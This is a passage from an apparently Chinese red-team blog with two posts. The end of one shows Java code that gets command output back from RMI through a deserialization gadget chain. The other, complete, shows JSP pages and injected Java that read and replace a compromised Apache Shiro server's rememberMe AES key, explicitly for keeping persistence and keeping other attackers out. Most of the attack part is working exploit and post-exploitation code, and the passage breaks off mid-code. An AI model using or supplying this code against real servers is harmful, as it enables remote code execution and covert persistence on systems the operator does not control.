class="keyword">void</span> <span class="title">removeNotificationListener</span><span class="params">(ObjectName name, ObjectName listener, MarshalledObject filter, MarshalledObject handback, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, ListenerNotFoundException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer[] addNotificationListeners(ObjectName[] names, MarshalledObject[] filters, Subject[] delegationSubjects) <span class="keyword">throws</span> InstanceNotFoundException, IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Integer[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeNotificationListeners</span><span class="params">(ObjectName name, Integer[] listenerIDs, Subject delegationSubject)</span> <span class="keyword">throws</span> InstanceNotFoundException, ListenerNotFoundException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> NotificationResult <span class="title">fetchNotifications</span><span class="params">(<span class="keyword">long</span> clientSequenceNumber, <span class="keyword">int</span> maxNotifications, <span class="keyword">long</span> timeout)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Jdk7u21利用链执行以上代码，当然所有能够执行代码的Gadget都能通过这种方式回显。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这里需要注意一下,ip填写127.0.0.1不填写公网ip。<br>registry限制只能localhost bind，这里相当于在目标机器执行代码往它自己registry中绑定，1099就填写正确的rmi registry端口即可。</p>
<p>使用exportObject暴露服务时，如果目标不存在安全组等其他策略填0即可，为0时会在一个随机端口暴露。如果存在安全策略，那么可以尝试绑定到80,443等常见端口上，能够访问的几率更大一点。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/11/29/16373251164055.jpg"></p>
<p>最后调用远程方法实现回显。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.security.auth.LdapPrincipal;</span><br><span class="line"><span class="keyword">import</span> com.sun.security.auth.UnixPrincipal;</span><br><span class="line"><span class="keyword">import</span> sun.jvm.hotspot.debugger.remote.RemoteDebugger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnection;</span><br><span class="line"><span class="keyword">import</span> javax.security.auth.Subject;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;ip&quot;</span>,port);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        for(String x:registry.list())&#123;</span></span><br><span class="line">        <span class="comment">//            System.out.println(x);</span></span><br><span class="line">        <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        Subject subject = <span class="keyword">new</span> Subject();</span><br><span class="line">        Field f = subject.getClass().getDeclaredField(<span class="string">&quot;principals&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Set set = <span class="keyword">new</span> HashSet();</span><br><span class="line">        UnixPrincipal unixPrincipal = <span class="keyword">new</span> UnixPrincipal(command);</span><br><span class="line">        set.add(unixPrincipal);</span><br><span class="line">        f.set(subject, set);</span><br><span class="line"></span><br><span class="line">        System.out.println(((RMIConnection)registry.lookup(<span class="string">&quot;MonitorService&quot;</span>)).getDefaultDomain(subject));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/11/29/16373256365280.jpg"></p>
<h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/A-D-Team/attackRmi">https://github.com/A-D-Team/attackRmi</a></p>
<p>利用lookup registry触发的反序列，比起bind能多打一些版本，无需出网无需落地文件。<br>目前只支持了CommonsCollections、CommonsBeanutils、Jdk7u21利用链，后续再更新利用链和看看是否要支持绕JEP290的那些方法。</p>
<p>众所周知，RMI服务客户端服务端可以双向攻击，为了解决这个问题，工具里没有依赖CommonsCollections、CommoneBeanutils包，把一些核心类给抽取了出来并且改了一些反序列化所需要的方法。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Java/">Java</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2021/11/19/通过代码执行修改Shiro密钥/"><span>通过代码执行修改Shiro密钥</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/11/19/通过代码执行修改Shiro密钥/" rel="bookmark">
        <time class="entry-date published" datetime="2021-11-18T16:03:19.000Z">
          2021-11-19
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>平时在做一些项目时，打点时发现Shiro反序列化漏洞后却不想其他攻击队通过此入口进来时，就需要修改Shiro的密钥了。</p>
<h2 id="如何修改密钥"><a href="#如何修改密钥" class="headerlink" title="如何修改密钥"></a>如何修改密钥</h2><p>首先大概了解一下Shiro反序列化漏洞，Shiro的反序列化出现在”记住我”的功能中，用来储存用户登录状态信息，实现自动登录，登录状态序列化后储存到cookie中。<br>Shiro默认使用了CookieRememberMeManager，反序列化经过的路径为，Cookie获取rememebrMe值-&gt;base64解码-&gt;AES解密-&gt;反序列。路径中其中最重要的就是AES解密，所以Shiro这洞是需要知道目标的AES密钥才能利用，在低版本(小于1.2.4)中如果开发者没有手动设置密钥，那么会使用默认密钥kPH+bIxk5D2deZiIxcaaaA==，如果默认密钥不正确也可以继续尝试Shiro 100Keys，在高版本中如果开发者没有手动设置密钥那么每次服务启动时都会随机生成一个密钥。</p>
<p>再回到改密钥的问题中，如果是常规的通过修改文件密钥后需要重启服务比较拉跨，最好的方式还是通过代码执行获取到cookieRememberMeManager然后调用它的setCipherKey方法直接修改密钥。</p>
<p>那么现在问题在于如何获取到服务启动时生成的cookieRememberMeManager，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultWebSecurityManager</span> <span class="keyword">extends</span> <span class="title">DefaultSecurityManager</span> <span class="keyword">implements</span> <span class="title">WebSecurityManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger log = LoggerFactory.getLogger(DefaultWebSecurityManager.class);</span><br><span class="line">    <span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String HTTP_SESSION_MODE = <span class="string">&quot;http&quot;</span>;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NATIVE_SESSION_MODE = <span class="string">&quot;native&quot;</span>;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">private</span> String sessionMode;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DefaultWebSecurityManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ((DefaultSubjectDAO)<span class="keyword">this</span>.subjectDAO).setSessionStorageEvaluator(<span class="keyword">new</span> DefaultWebSessionStorageEvaluator());</span><br><span class="line">        <span class="keyword">this</span>.sessionMode = <span class="string">&quot;http&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.setSubjectFactory(<span class="keyword">new</span> DefaultWebSubjectFactory());</span><br><span class="line">        <span class="keyword">this</span>.setRememberMeManager(<span class="keyword">new</span> CookieRememberMeManager());</span><br><span class="line">        <span class="keyword">this</span>.setSessionManager(<span class="keyword">new</span> ServletContainerSessionManager());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在服务启动时，会调用DefaultWebSecurityManager#setRememberMeManager方法将cookieRememberMeManager保存到DefaultSecurityManager的rememberMeManager属性中。</p>
<p>那么只要能获取到DefaultWebSecurityManager再获取rememberMeManager属性即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> WebSecurityManager <span class="title">createWebSecurityManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Ini ini = <span class="keyword">this</span>.getIni();</span><br><span class="line">    WebIniSecurityManagerFactory factory;</span><br><span class="line">    <span class="keyword">if</span> (CollectionUtils.isEmpty(ini)) &#123;</span><br><span class="line">        factory = <span class="keyword">new</span> WebIniSecurityManagerFactory();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        factory = <span class="keyword">new</span> WebIniSecurityManagerFactory(ini);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WebSecurityManager wsm = (WebSecurityManager)factory.getInstance();</span><br><span class="line">    Map&lt;String, ?&gt; beans = factory.getBeans();</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(beans)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.objects.putAll(beans);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wsm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IniWebEnvironment#createWebSecurityManager方法中，在服务启动时通过工厂模式生成了WebSecurityManagaer后,put保存到DefaultEnvironment的objects属性中，如果能获取到Environment就能获取到WebSecurityManagaer。</p>
<p>org.apache.shiro.web.util.WebUtils</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WebEnvironment <span class="title">getRequiredWebEnvironment</span><span class="params">(ServletContext sc)</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line">    WebEnvironment we = getWebEnvironment(sc);</span><br><span class="line">    <span class="keyword">if</span> (we == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;No WebEnvironment found: no EnvironmentLoaderListener registered?&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> we;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提供了一个static方法WebEnvironment，能够根据servletcontext获取到WebEnvironment，在WebEnvironment中又直接提供了getWebSecurityManager方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> WebSecurityManager <span class="title">getWebSecurityManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecurityManager sm = <span class="keyword">super</span>.getSecurityManager();</span><br><span class="line">    <span class="keyword">this</span>.assertWebSecurityManager(sm);</span><br><span class="line">    <span class="keyword">return</span> (WebSecurityManager)sm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getWebSecurityManager方法中最后调用了lookupSecurityManager方法获取SecurityManager，其实也就是从DefaultEnvironment的objects属性中获取的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> SecurityManager <span class="title">lookupSecurityManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.getSecurityManagerName();</span><br><span class="line">    <span class="keyword">return</span> (SecurityManager)<span class="keyword">this</span>.getObject(name, SecurityManager.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取到WebSecurityManager后就很简单了，通过反射获取父类DefaultWebSecurityManager的rememberMeManager属性，再调用setCipherKey。</p>
<p>如果是通过其他漏洞拿下的权限，需要知道此时shiro的密钥做权限维持等操作时，就调用getCipherKey获取。</p>
<p>JSP版本</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.mgt.CookieRememberMeManager&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.mgt.WebSecurityManager&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.env.WebEnvironment&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.util.WebUtils&quot;</span> %&gt;&lt;%</span><br><span class="line">    WebEnvironment env = WebUtils.getRequiredWebEnvironment(request.getServletContext());</span><br><span class="line">    WebSecurityManager webSecurityManager = env.getWebSecurityManager();</span><br><span class="line"></span><br><span class="line">    Field f = webSecurityManager.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;rememberMeManager&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) f.get(webSecurityManager);</span><br><span class="line">    out.print(<span class="keyword">new</span> BASE64Encoder().encode(cookieRememberMeManager.getCipherKey()));</span><br><span class="line">    cookieRememberMeManager.setCipherKey(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(<span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/11/17/16371379502372.jpg"></p>
<p>查看了下WebUtils.getRequiredWebEnvironment方法，最后调用的是getWebEnvironment方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WebEnvironment <span class="title">getWebEnvironment</span><span class="params">(ServletContext sc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getWebEnvironment(sc, EnvironmentLoader.ENVIRONMENT_ATTRIBUTE_KEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WebEnvironment <span class="title">getWebEnvironment</span><span class="params">(ServletContext sc, String attrName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sc == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;ServletContext argument must not be null.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Object attr = sc.getAttribute(attrName);</span><br><span class="line">        <span class="keyword">if</span> (attr == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attr <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RuntimeException)attr;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attr <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (Error)attr;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (attr <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException((Exception)attr);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(attr <span class="keyword">instanceof</span> WebEnvironment)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Context attribute is not of type WebEnvironment: &quot;</span> + attr);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (WebEnvironment)attr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实也就是从servletcontext中获取的org.apache.shiro.web.env.EnvironmentLoader.ENVIRONMENT_ATTRIBUTE_KEY属性，就可以再改一版更方便的出来了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.mgt.CookieRememberMeManager&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.mgt.WebSecurityManager&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.env.DefaultWebEnvironment&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    WebSecurityManager webSecurityManager = ((DefaultWebEnvironment)request.getServletContext().getAttribute(<span class="string">&quot;org.apache.shiro.web.env.EnvironmentLoader.ENVIRONMENT_ATTRIBUTE_KEY&quot;</span>)).getObject(<span class="string">&quot;securityManager&quot;</span>, DefaultWebSecurityManager.class);</span><br><span class="line"></span><br><span class="line">    Field f = webSecurityManager.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;rememberMeManager&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) f.get(webSecurityManager);</span><br><span class="line">    out.print(<span class="keyword">new</span> BASE64Encoder().encode(cookieRememberMeManager.getCipherKey()));</span><br><span class="line">    cookieRememberMeManager.setCipherKey(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(<span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>最方便的还是直接借助shiro的反序列化执行JAVA代码修改密钥。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Method method;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    MBeanServer mbeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">    Field field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object obj = field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">    field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Repository repository = (Repository) field.get(obj);</span><br><span class="line">    Set&lt;NamedObject&gt; objectSet =  repository.query(<span class="keyword">new</span> ObjectName(<span class="string">&quot;Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*&quot;</span>), <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">for</span>(NamedObject namedObject : objectSet) &#123;</span><br><span class="line">        DynamicMBean dynamicMBean = namedObject.getObject();</span><br><span class="line">        field = dynamicMBean.getClass().getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        obj = field.get(dynamicMBean);</span><br><span class="line">        field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object standardContext = field.get(obj);</span><br><span class="line">        method = standardContext.getClass().getDeclaredMethod(<span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">        WebSecurityManager webSecurityManager = ((DefaultWebEnvironment)((ServletContext)method.invoke(standardContext)).getAttribute(<span class="string">&quot;org.apache.shiro.web.env.EnvironmentLoader.ENVIRONMENT_ATTRIBUTE_KEY&quot;</span>)).getObject(<span class="string">&quot;securityManager&quot;</span>, DefaultWebSecurityManager.class);</span><br><span class="line">        Field f = webSecurityManager.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;rememberMeManager&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) f.get(webSecurityManager);</span><br><span class="line">        cookieRememberMeManager.setCipherKey(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(<span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/11/17/16371393668757.jpg"></p>
<p>在后期发现WebUtils.getRequiredWebEnvironment这种方式只能在Tomcat下使用，当环境为springboot时返回”No WebEnvironment found: no EnvironmentLoaderListener registered?”, 没有注册WebEnvironment。 Springboot就只能从其他路径来获取WebSecurity了，从context中依然能够拿到DefaultSecurityManager，原理都是差不多的，就不再多介绍了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ServletRequestAttributes s = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes());</span><br><span class="line">    Field field_req = s.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field_req.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ServletContext servletContext = ((RequestFacade) field_req.get(s)).getServletContext();</span><br><span class="line">    Field f = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext ac = (ApplicationContext) f.get(servletContext);</span><br><span class="line">    org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext w = (AnnotationConfigServletWebServerApplicationContext) ac.getAttribute(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>);</span><br><span class="line">    f = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.DefaultSingletonBeanRegistry&quot;</span>).getDeclaredField(<span class="string">&quot;singletonObjects&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ConcurrentHashMap concurrentHashMap = (ConcurrentHashMap) f.get(w.getAutowireCapableBeanFactory());</span><br><span class="line">    DefaultSecurityManager defaultSecurityManager = (DefaultSecurityManager) concurrentHashMap.get(<span class="string">&quot;securityManager&quot;</span>);</span><br><span class="line">    